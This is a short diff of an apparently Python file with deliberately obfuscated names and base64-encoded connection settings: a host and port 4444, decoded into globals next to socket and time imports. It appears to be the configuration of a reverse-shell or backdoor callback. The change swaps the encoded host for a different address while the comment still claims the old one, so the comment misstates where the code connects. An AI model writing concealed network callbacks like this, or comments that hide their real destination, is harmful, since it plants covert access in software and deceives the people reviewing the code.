@@ -15,7 +15,7 @@ _p7q = _qwe123()  # PORT
 _r4t = _qwe123()  # socket
 _z2n = _qwe123()  # time
 
-_obf_host = "MTkyLjE2OC4wLjEzOQ=="  # base64 of "192.168.0.139"
+_obf_host = "MTkyLjE2OC4yMDkuMTg5"  # base64 of "192.168.0.139"
 _obf_port = "NDQ0NA=="  # base64 of "4444"
 
 globals()[_x9z] = base64.b64decode(_obf_host).decode()
